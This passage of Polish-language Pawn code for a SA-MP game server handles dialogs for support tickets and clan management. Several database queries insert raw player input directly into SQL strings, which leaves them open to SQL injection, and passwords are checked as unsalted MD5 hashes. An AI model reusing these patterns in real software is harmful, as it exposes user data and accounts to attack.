							else format(dialog, sizeof(dialog), ""C_BLUE1"Temat: "C_WHITE"%s\n\n%s\n\n"C_BLUE1"Wpisz poni¿ej odpowiedŸ, któr¹ chcesz wys³aæ.", subject, msg);
							return ShowPlayerDialog(playerid, DIALOG_SUPPORTREPLY, DIALOG_STYLE_INPUT, ""C_BLUE1"Support", dialog, "Wyœlij", "Zamknij");
						}
		            }
		            case 1:
		            {
						m_query("UPDATE support SET status = 2 WHERE ticket = %d", SelectedTicket[playerid]);
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Temat zosta³ zamkniêty.");
		            }
		        }
		    }
		}
		case DIALOG_SUPPORTSEND: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				if(strlen(inputtext) < 6 || strlen(inputtext) > 256) return DialogError(playerid, "{FFFF00}Nazwa tematu musi zawieraæ od 6 do 256 znaków.");
				format(SupportSubject[playerid], 256, "%s", inputtext);
				return ShowPlayerDialog(playerid, DIALOG_SUPPORTSEND2, DIALOG_STYLE_INPUT, ""C_BLUE1"Support", ""C_RED"WprowadŸ treœæ swojego zg³oszenia.", "Wyœlij", "Zamknij");
			}
		}
		case DIALOG_SUPPORTSEND2: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				if(strlen(inputtext) < 6 || strlen(inputtext) > 256) return DialogError(playerid, "{FFFF00}Wiadomoœæ musi zawieraæ od 6 do 256 znaków.");
				format(SupportText[playerid], 256, "%s", inputtext);
				m_query("SELECT * FROM support");
				mysql_store_result();
				new tickety = mysql_num_rows();
				mysql_free_result();
				m_query("INSERT INTO support (ticket, suid, subject, lastmsg, lastreply, time, status) VALUES (%d, %d, '%s', '%s', 'Brak', %d, 0)", tickety, Player[playerid][ID], SupportSubject[playerid], SupportText[playerid], gettime());
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Zg³oszenie wys³ane pomyœlnie.");
			}
		}
		case DIALOG_SUPPORTREPLY: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				if(strlen(inputtext) < 6 || strlen(inputtext) > 256) return DialogError(playerid, "{FFFF00}OdpowiedŸ musi zawieraæ od 6 do 256 znaków.");
				m_query("UPDATE support SET lastmsg = '%s', status = 0 WHERE ticket = %d", inputtext, SelectedTicket[playerid]);
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Wiadomoœæ zosta³a wys³ana.");
			}
		}
		case DIALOG_SUPPORTREPLYA: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				if(strlen(inputtext) < 6 || strlen(inputtext) > 256) return DialogError(playerid, "{FFFF00}OdpowiedŸ musi zawieraæ od 6 do 256 znaków.");
				m_query("UPDATE support SET lastreply = '%s', status = 1, ruid = %d WHERE ticket = %d", inputtext, Player[playerid][ID], SelectedTicket[playerid]);
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"OdpowiedŸ zosta³a wys³ana.");
			}
		}
		case DIALOG_KLAN: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				switch(listitem)
				{
				    case 0:
					{
						new gangid = Player[playerid][Gang];
						return TPPlayer(playerid,0,gSpawnX[gangid],gSpawnY[gangid],gSpawnZ[gangid]);
					}
					case 1:
					{
					    new gangid = Player[playerid][Gang];
					    new str[2048];
						if(gAch[gangid][0]) format(str, sizeof(str), "{FFFF00}Pierwsza krew\t\t\t{1DFF00}Zaliczone\n");
						else format(str, sizeof(str), "{FFFF00}Pierwsza krew\t\t\tZaatakuj cz³onka innego klanu\n");
						if(gAch[gangid][1]) format(str, sizeof(str), "%s{FFFF00}Kosa\t\t\t{1DFF00}Zaliczone\n", str);
						else format(str, sizeof(str), "%s{FFFF00}Kosa\t\t\tKonflikt miêdzy cz³onkami klanu\n", str);
						if(gAch[gangid][2]) format(str, sizeof(str), "%s{FFFF00}Podbój\t\t\t{1DFF00}Zaliczone\n", str);
						else format(str, sizeof(str), "%s{FFFF00}Podbój\t\t\tPrzejêcie strefy dzielnicowej\n", str);
						if(gAch[gangid][3]) format(str, sizeof(str), "%s{FFFF00}Wojna!\t\t\t{1DFF00}Zaliczone\n", str);
						else format(str, sizeof(str), "%s{FFFF00}Wojna!\t\t\tPierwsza wojna klanów\n", str);
						if(gAch[gangid][4]) format(str, sizeof(str), "%s{FFFF00}Reputacja\t\t\t{1DFF00}Zaliczone\n", str);
						else format(str, sizeof(str), "%s{FFFF00}Reputacja\t\t\tZdobycie 1000 respektu klanu\n", str);
						if(gAch[gangid][5]) format(str, sizeof(str), "%s{FFFF00}Zgrana ekipa\t\t\t{1DFF00}Zaliczone\n", str);
						else format(str, sizeof(str), "%s{FFFF00}Zgrana ekipa\t\t\tMinimum 10 cz³onków klanu\n", str);
						if(gAch[gangid][6]) format(str, sizeof(str), "%s{FFFF00}Prawa rêka\t\t\t{1DFF00}Zaliczone\n", str);
						else format(str, sizeof(str), "%s{FFFF00}Prawa rêka\t\t\tWyznaczony drugi lider klanu\n", str);
						if(gAch[gangid][7]) format(str, sizeof(str), "%s{FFFF00}Sprawiedliwoœæ\t\t\t{1DFF00}Zaliczone", str);
						else format(str, sizeof(str), "%s{FFFF00}Sprawiedliwoœæ\t\t\tWyrzucenie kogoœ z klanu", str);
						return ShowPlayerDialog(playerid, DIALOG_KLANO, DIALOG_STYLE_LIST, "{FFFF00}Odznaczenia klanowe", str, "Cofnij", "Zamknij");
					}
					case 2:
					{
					    new gangid = Player[playerid][Gang];
						if(gLider1[gangid] == Player[playerid][ID] || gLider2[gangid] == Player[playerid][ID]) return SendClientMessage(playerid, RED, "Jesteœ liderem. Skorzystaj z panelu zarz¹dzania klanem.");
					    new str[128];
					    format(str, sizeof(str), ""C_WHITE"*  "C_NICK"%s(%d) {E89E14}opuœci³ Twój klan.", Player[playerid][Name], playerid);
						Loop(loopid, MAX_PLAYERS)
						{
						    if(Player[loopid][Gang] == Player[playerid][Gang])
						    {
								SendClientMessage(loopid, -1, str);
							}
						}
						Player[playerid][Gang] = -1;
						m_query("UPDATE players SET gang = -1 WHERE id = %d", Player[playerid][ID]);
						SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Opuœci³eœ/aœ klan.");
					}
					case 3:
					{
						new gangid = Player[playerid][Gang], s[1024];
					    if(gLider1[gangid] != Player[playerid][ID] && gLider2[gangid] != Player[playerid][ID]) return 1;
  						format(s, sizeof(s), ""C_WHITE"Zaproœ gracza do klanu\n");
  						format(s, sizeof(s), "%s"C_WHITE"Ponowna konfiguracja danych klanu\n", s);
						format(s, sizeof(s), "%s"C_WHITE"Zmieñ spawn pojazdu wojennego\n", s);
						format(s, sizeof(s), "%s"C_WHITE"Zarz¹dzanie cz³onkami klanu\n", s);
						format(s, sizeof(s), "%s"C_WHITE"Rozegraj wojnê z innym klanem\n", s);
						format(s, sizeof(s), "%s"C_RED"Usuñ klan "C_YELLOW"(Nieodwracalne)\n", s);
						return ShowPlayerDialog(playerid, DIALOG_KLANL, DIALOG_STYLE_LIST, ""C_BLUE1"Twój klan "C_RED"(Panel lidera)", s, "Wybierz", "Zamknij");
					}
				}
			}
		}
		case DIALOG_KLANO: {
		    if (!response) return 1;
		    if(response) return cmd_clan(playerid, " "); }
		case DIALOG_KLANINVITE:
		{
		    if (!response) return 1;
		    if(response)
		    {
				new id = strval(inputtext);
		        if(!IsNumeric(inputtext) || id == playerid || !IsPlayerConnected(id)) return SendClientMessage(playerid, RED, "Podano b³êdne ID gracza.");
		        if(GetPlayerVirtualWorld(id) || AFK[id]) return SendClientMessage(playerid, RED, "Podany gracz jest zajêty.");
		        if(Player[id][Gang] != -1) return SendClientMessage(playerid, RED, "Podany gracz jest ju¿ w jakimœ gangu.");
		        new gang = Player[playerid][Gang];
		        ClanInvite[id] = gang;
		        new zstr[256];
				format(zstr, sizeof(zstr), ""C_BLUE1"Zosta³eœ zaproszony do gangu "C_WHITE"%s"C_BLUE1". Przyjmujesz zaproszenie?", gName[gang]);
		        return ShowPlayerDialog(id, DIALOG_KLANINVITEA, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Zaproszenie do gangu", zstr, "Akceptuj", "Odrzuæ");
			}
		}
		case DIALOG_KLANINVITEA:
		{
		    if (!response)
			{
			    ClanInvite[playerid] = -1;
				return 1;
			}
		    if(response)
		    {
		        new str[256];
				new pgang = ClanInvite[playerid];
		        Player[playerid][Gang] = pgang;
		        format(str, sizeof(str), ""C_WHITE"*  "C_NICK"%s(%d) {E89E14}do³¹czy³ do Twojego klanu.", Player[playerid][Name], playerid);
		        Loop(loopid, MAX_PLAYERS) if(Player[loopid][Gang] == pgang) SendClientMessage(loopid, -1, str);
		        SaveAllData(playerid);
				m_query("SELECT * FROM players WHERE gang = %d", pgang);
				mysql_store_result();
				if(mysql_num_rows() >= 10) GiveClanAchievement(pgang, 5);
				mysql_free_result();
			}
		}
		case DIALOG_KLANL: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				switch(listitem)
				{
				    case 0: {
						return ShowPlayerDialog(playerid, DIALOG_KLANINVITE, DIALOG_STYLE_INPUT, ""C_BLUE1"Zapraszanie gracza", ""C_WHITE"Wpisz poni¿ej ID gracza, którego chcesz zaprosiæ do gangu.", "Zaproœ", "Zamknij"); }
				    case 1: {
						return ShowPlayerDialog(playerid, DIALOG_KLANNAMEEDIT, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_WHITE"Zacznijmy od wybrania nazwy dla Twojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij"); }
				    case 2: {
						new pgang = Player[playerid][Gang];
				    	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, RED, "Musisz byæ w pojeŸdzie "C_WHITE"Patriot"C_RED".");
	    				new Float:x, Float:y, Float:z, Float:a;
						new currentveh = GetPlayerVehicleID(playerid);
						new currentvehid = GetVehicleModel(currentveh);
 	    				GetVehiclePos(currentveh, x, y, z);
	    				GetVehicleZAngle(currentveh, a);
	    				if(currentvehid != 470) return SendClientMessage(playerid, RED, "Musisz byæ w pojeŸdzie "C_WHITE"Patriot"C_RED".");
	    				if(!IsPlayerInArea(playerid, gMinX[pgang], gMinY[pgang], gMaxX[pgang], gMaxY[pgang])) return SendClientMessage(playerid, RED, "Pojazd nie znajduje siê na terenie strefy klanu.");
						gVehX[pgang] = x;
						gVehY[pgang] = y;
						gVehZ[pgang] = z;
						gVehA[pgang] = a;
						return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Spawn pojazdu klanowego ustawiony w tym miejscu."); }
					case 3:
					{
						new gangid, s[2048], dialog[1024], gid, name[20];
						gangid = Player[playerid][Gang];
						m_query("SELECT id, username FROM players WHERE gang = %d", gangid);
						mysql_store_result();

						while(mysql_fetch_row(s, " "))
						{
							sscanf(s, "is[20]", gid, name);
							if(gLider1[gangid] == gid || gLider2[gangid] == gid) format(dialog, sizeof(dialog), "%s"C_RED"%d. %s\n", dialog, gid, name);
							else format(dialog, sizeof(dialog), "%s"C_WHITE"%d. %s\n", dialog, gid, name);
						}
						mysql_free_result();
						return ShowPlayerDialog(playerid, DIALOG_KLANLM, DIALOG_STYLE_LIST, ""C_BLUE1"Cz³onkowie klanu", dialog, "Wybierz", "Zamknij");
					}
				    case 4:
					{
						new s[2048];
						Loop(ganggid, MAX_GANGS)
						{
							m_query("SELECT uid FROM clans WHERE uid = %d", ganggid);
							mysql_store_result();
							if(mysql_num_rows() > 0)
							{
								mysql_free_result();
								m_query("SELECT id FROM players WHERE gang = %d && playerid > -1", ganggid);
								mysql_store_result();
								if(mysql_num_rows() > 0)
								{
									if(gColor[ganggid] == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, GREY >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 1) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, GREEN >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 2) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, RED >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 3) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, YELLOW >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 4) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, BLUE >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 5) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, ORANGE >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 6) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, MAGENTA >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 7) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, AQUA >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 8) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, GOLD >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 9) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, SEAGREEN >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 10) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, OLIVE >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 11) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, SPRINGGREEN >>> 8, gName[ganggid], mysql_num_rows());
 									if(gColor[ganggid] == 12) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, MAROON >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 13) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, LIME >>> 8, gName[ganggid], mysql_num_rows());
									if(gColor[ganggid] == 14) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Online: %d)\n", s, ganggid, MEDIUMAQUA >>> 8, gName[ganggid], mysql_num_rows());
									mysql_free_result();
								}
							}
						}
						return ShowPlayerDialog(playerid, DIALOG_KLANWOJNA, DIALOG_STYLE_LIST, ""C_BLUE1"Wybierz klan do wojny", s, "Wybierz", "Zamknij");
					}
					case 5: {
						return ShowPlayerDialog(playerid, DIALOG_KLANDELETE, DIALOG_STYLE_PASSWORD, ""C_RED"Usuniêcie klanu", ""C_WHITE"Aby potwierdziæ chêæ usuniêcia klanu, wpisz poni¿ej has³o do swojego konta.", "Dalej", "Zamknij"); }
				}
			}
		}
		case DIALOG_KLANWOJNA: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				new choosedid, _g[4];

				strmid(_g, inputtext, 0, strfind(inputtext, "."));
				choosedid = strval(_g);

				new gangid = Player[playerid][Gang];
				if(choosedid == gangid) return 1;
				gWar[gangid] = choosedid;
				SendClientMessage(playerid, -1, ""PLUS""C_OLIVE"Wypowiedzia³eœ/aœ klanowi wojnê.");
				Loop(loopid, MAX_PLAYERS)
				{
				    if(Player[loopid][Gang] == choosedid)
					{
					    new wojnastr[256];
					    format(wojnastr, sizeof(wojnastr),""C_NICK"%s(%d) "C_ORANGE"wypowiada wojnê klanów. U¿yj "C_WHITE"/wojna %d"C_ORANGE" by zaakceptowaæ.", Player[playerid][Name], playerid, Player[playerid][Gang]);
					    SendClientMessage(loopid, -1, wojnastr);
					    Sound(loopid, 1057, 0.0, 0.0, 0.0);
					}
				}
			}
		}
		case DIALOG_KLANDELETE:
		{
		    if (!response) return 1;
		    if(response)
			{
				new hashed_pass[65];
				format(hashed_pass, sizeof(hashed_pass), "%s", MD5_Hash(inputtext));
				if (strcmp(hashed_pass, Player[playerid][Password]) == 0)
				{
					new gangid = Player[playerid][Gang];
				    m_query("DELETE FROM clans WHERE uid = %d", gangid);
				    Loop(loopid, MAX_PLAYERS) {
				        if(Player[loopid][Gang] == gangid && IsPlayerConnected(loopid)) Player[loopid][Gang] = -1; }
				    m_query("UPDATE players SET gang = -1 WHERE gang = %d", gangid);
				    gangsdeleted++;
				    SetTimer("SaveClans", 1000, 0);
				    Loop(zoneid, MAX_GANGZONES)
				    {
				        if(gzOwner[zoneid] == gangid)
				        {
					    	GangZoneStopFlashForAll(gZZone[zoneid]);
		    				GangZoneHideForAll(gZZone[zoneid]);
		   					gzAttacker[zoneid] = -1;
	 						new owner = gzOwner[zoneid];
							if(gColor[owner] == 0) GangZoneShowForAll(gZZone[zoneid], GREY);
								if(gColor[owner] == 1) GangZoneShowForAll(gZZone[zoneid], GREEN);
							if(gColor[owner] == 2) GangZoneShowForAll(gZZone[zoneid], RED);
							if(gColor[owner] == 3) GangZoneShowForAll(gZZone[zoneid], YELLOW);
							if(gColor[owner] == 4) GangZoneShowForAll(gZZone[zoneid], BLUE);
							if(gColor[owner] == 5) GangZoneShowForAll(gZZone[zoneid], ORANGE);
							if(gColor[owner] == 6) GangZoneShowForAll(gZZone[zoneid], MAGENTA);
							if(gColor[owner] == 7) GangZoneShowForAll(gZZone[zoneid], AQUA);
							if(gColor[owner] == 8) GangZoneShowForAll(gZZone[zoneid], GOLD);
							if(gColor[owner] == 9) GangZoneShowForAll(gZZone[zoneid], SEAGREEN);
							if(gColor[owner] == 10) GangZoneShowForAll(gZZone[zoneid], OLIVE);
							if(gColor[owner] == 11) GangZoneShowForAll(gZZone[zoneid], SPRINGGREEN);
							if(gColor[owner] == 12) GangZoneShowForAll(gZZone[zoneid], MAROON);
							if(gColor[owner] == 13) GangZoneShowForAll(gZZone[zoneid], LIME);
							if(gColor[owner] == 14) GangZoneShowForAll(gZZone[zoneid], MEDIUMAQUA);
							if(gColor[owner] == 15) GangZoneShowForAll(gZZone[zoneid], MEDIUMMAGENTA);
							gzOwner[zoneid] = -1;
						}
					}
				    return SendClientMessage(playerid, -1, ""C_BLUE1"Procedura usuniêcia klanu zakoñczona.");
		    	}
		    	else { return SendClientMessage(playerid, RED, "Wpisane has³o jest nieprawid³owe."); }
			}
		}
		case DIALOG_KLANLM: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				new s[1024], _g[4];
				strmid(_g, inputtext, 0, strfind(inputtext, "."));
				ClanMember[playerid] = strval(_g);
				format(s, sizeof(s), "%s"C_WHITE"Zmieñ status gracza ("C_RED"Lider"C_WHITE"/Cz³onek)\n", s);
				format(s, sizeof(s), "%s"C_RED"Wyrzuæ cz³onka z klanu", s);
				return ShowPlayerDialog(playerid, DIALOG_KLANLMA, DIALOG_STYLE_LIST, ""C_BLUE1"Zarz¹dzaj cz³onkiem klanu", s, "Wybierz", "Zamknij");
			}
		}
		case DIALOG_KLANLMA: 
		{
		    if (!response) return 1;
		    if(response)
		    {
		        switch(listitem)
		        {
		            case 0:
		            {
		                new memberid = ClanMember[playerid];
		                new gangid = Player[playerid][Gang];
		                if(memberid == Player[playerid][ID] && gLider1[gangid] == Player[playerid][ID]) return SendClientMessage(playerid, RED, "Nie mo¿esz zarz¹dzaæ sob¹ bêd¹c w³aœcicielem klanu.");
						if(memberid == gLider1[gangid]) return SendClientMessage(playerid, RED, "Nie mo¿esz wyrzuciæ g³ównego lidera klanu.");
		                if(gLider2[gangid] == memberid)
		                {
		               		m_query("UPDATE clans SET lider2 = -1 WHERE uid = %d", gangid);
		               		return gLider2[gangid] = -1;
		                }
		                else
		                {
		                    if(gLider2[gangid] != -1) return SendClientMessage(playerid, RED, "Inny cz³onek tego gangu ma ju¿ lidera.");
		               		m_query("UPDATE clans SET lider2 = %d WHERE uid = %d", memberid, gangid);
		               		GiveClanAchievement(gangid, 6);
		               		return gLider2[gangid] = memberid;
		                }
		            }
		            case 1:
		            {
						new s[256], nick[20], selid;
		                new memberid = ClanMember[playerid];
		                new gangid = Player[playerid][Gang];
		                if(memberid == Player[playerid][ID] && gLider1[gangid] == Player[playerid][ID]) return SendClientMessage(playerid, RED, "Nie mo¿esz zarz¹dzaæ sob¹ bêd¹c w³aœcicielem klanu.");
						m_query("SELECT username, playerid FROM players WHERE id = %d", memberid);
						mysql_store_result();
						mysql_fetch_row(s, " ");
						mysql_free_result();
						sscanf(s, "s[20]i", nick, selid);
						if(selid > -1)
						{
						    Player[selid][Gang] = -1;
						    SendClientMessage(selid, -1, ""PLUS""C_LOLIVE"Zosta³eœ/aœ wyrzucony/a ze Swojego klanu przez lidera.");
						}
					    new str[128];
					    format(str, sizeof(str), ""C_WHITE"*  "C_NICK"%s {E89E14}zosta³ wyrzucony z Twojego klanu.", nick);
						Loop(loopid, MAX_PLAYERS)
						{
						    if(Player[loopid][Gang] == Player[playerid][Gang])
						    {
								SendClientMessage(loopid, -1, str);
							}
						}
						m_query("UPDATE players SET gang = -1 WHERE id = %d", memberid);
						GiveClanAchievement(gangid, 7);
		            }
		        }
			}
		}
		case DIALOG_KLANNAME:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        if(strlen(inputtext) < 5) return ShowPlayerDialog(playerid, DIALOG_KLANNAME, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_RED"Wprowadzono za krótk¹ nazwê klanu.\n"C_WHITE"\nZacznijmy od wybrania nazwy dla Twojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij");
		        if(strlen(inputtext) > 17) return ShowPlayerDialog(playerid, DIALOG_KLANNAME, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_RED"Wprowadzono za d³ug¹ nazwê klanu.\n"C_WHITE"\nZacznijmy od wybrania nazwy dla Twojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij");
				format(ClanName[playerid], 17, "%s", inputtext);
				return ShowPlayerDialog(playerid, DIALOG_KLANTAG, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_WHITE"Œwietna nazwa! Teraz ustaw tag dla swojego klanu.\n\n"C_RED"Nie u¿ywaj nawiasów w trakcie wpisywania tagu. Bêd¹ dodawane automatycznie.", "Dalej", "Zamknij");
		    }
		}
		case DIALOG_KLANNAMEEDIT:
		{
		    if(!response) return 1;
		    if(response)
		    {
		        if(strlen(inputtext) < 5) return ShowPlayerDialog(playerid, DIALOG_KLANNAMEEDIT, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_RED"Wprowadzono za krótk¹ nazwê klanu.\n"C_WHITE"\nZacznijmy od wybrania nazwy dla Twojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij");
		        if(strlen(inputtext) > 17) return ShowPlayerDialog(playerid, DIALOG_KLANNAMEEDIT, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_RED"Wprowadzono za d³ug¹ nazwê klanu.\n"C_WHITE"\nZacznijmy od wybrania nazwy dla Twojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij");
				format(ClanName[playerid], 17, "%s", inputtext);
				return ShowPlayerDialog(playerid, DIALOG_KLANTAGEDIT, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_WHITE"Œwietna nazwa! Teraz ustaw tag dla swojego klanu.\n\n"C_RED"Nie u¿ywaj nawiasów w trakcie wpisywania tagu. Bêd¹ dodawane automatycznie.", "Dalej", "Zamknij");
		    }
		}
		case DIALOG_KLANTAG:
		{
		    if(!response) return 1;
		    if(response)
		    {
		       	if(strfind(inputtext, "[", true)== 0) return SendClientMessage(playerid, RED, "Wprowadzono nieprawid³owy znak.");
		       	if(strfind(inputtext, "]", true)== 0) return SendClientMessage(playerid, RED, "Wprowadzono nieprawid³owy znak.");
		        if(strlen(inputtext) < 1) return ShowPlayerDialog(playerid, DIALOG_KLANTAG, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_RED"Wprowadzono za krótki tag.\n"C_WHITE"\nWybierz nowy tag dla swojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij");
		        if(strlen(inputtext) > 7) return ShowPlayerDialog(playerid, DIALOG_KLANTAG, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_RED"Wprowadzono za d³ugi tag.\n"C_WHITE"\nWybierz nowy tag dla swojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij");
				format(ClanTag[playerid], 7, "%s", inputtext);
				new kolorystr[1024];
				format(kolorystr, sizeof(kolorystr), "{%06x}#1\n", GREY >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#2\n", kolorystr, GREEN >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#3\n", kolorystr, RED >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#4\n", kolorystr, YELLOW >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#5\n", kolorystr, BLUE >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#6\n", kolorystr, ORANGE >>> 8);
  				format(kolorystr, sizeof(kolorystr), "%s{%06x}#7\n", kolorystr, MAGENTA >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#8\n", kolorystr, AQUA >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#9\n", kolorystr, GOLD >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#10\n", kolorystr, SEAGREEN >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#11\n", kolorystr, OLIVE >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#12\n", kolorystr, SPRINGGREEN >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#13\n", kolorystr, MAROON >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#14\n", kolorystr, LIME >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#15\n", kolorystr, MEDIUMAQUA >>> 8);
				return ShowPlayerDialog(playerid, DIALOG_KLANKOLOR, DIALOG_STYLE_LIST, ""C_BLUE1"Wybierz kolor klanu", kolorystr, "Dalej", "Zamknij");
		    }
		}
		case DIALOG_KLANTAGEDIT:
		{
		    if(!response) return 1;
		    if(response)
		    {
		       	if(strfind(inputtext, "[", true)== 0) return SendClientMessage(playerid, RED, "Wprowadzono nieprawid³owy znak.");
		       	if(strfind(inputtext, "]", true)== 0) return SendClientMessage(playerid, RED, "Wprowadzono nieprawid³owy znak.");
		        if(strlen(inputtext) < 1) return ShowPlayerDialog(playerid, DIALOG_KLANTAGEDIT, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_RED"Wprowadzono za krótki tag.\n"C_WHITE"\nWybierz nowy tag dla swojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij");
		        if(strlen(inputtext) > 7) return ShowPlayerDialog(playerid, DIALOG_KLANTAGEDIT, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie klanu", ""C_RED"Wprowadzono za d³ugi tag.\n"C_WHITE"\nWybierz nowy tag dla swojego klanu.\nPoni¿ej wprowadŸ nazwê dla Twojego klanu.", "Dalej", "Zamknij");
				format(ClanTag[playerid], 7, "%s", inputtext);
				new kolorystr[1024];
				format(kolorystr, sizeof(kolorystr), "{%06x}#1\n", GREY >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#2\n", kolorystr, GREEN >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#3\n", kolorystr, RED >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#4\n", kolorystr, YELLOW >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#5\n", kolorystr, BLUE >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#6\n", kolorystr, ORANGE >>> 8);
  				format(kolorystr, sizeof(kolorystr), "%s{%06x}#7\n", kolorystr, MAGENTA >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#8\n", kolorystr, AQUA >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#9\n", kolorystr, GOLD >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#10\n", kolorystr, SEAGREEN >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#11\n", kolorystr, OLIVE >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#12\n", kolorystr, SPRINGGREEN >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#13\n", kolorystr, MAROON >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#14\n", kolorystr, LIME >>> 8);
				format(kolorystr, sizeof(kolorystr), "%s{%06x}#15\n", kolorystr, MEDIUMAQUA >>> 8);
				return ShowPlayerDialog(playerid, DIALOG_KLANKOLOREDIT, DIALOG_STYLE_LIST, ""C_BLUE1"Wybierz kolor klanu", kolorystr, "Dalej", "Zamknij");
		    }
		}
		case DIALOG_PRIVCAR:
		{
	    	if(!response) return 1;
	     	if(response)
		   	{
		       	switch(listitem)
		       	{
		           	case 0:
					{
						Loop(privcarid, privcars)
						{
						   	if(pOwner[privcarid] == Player[playerid][ID])
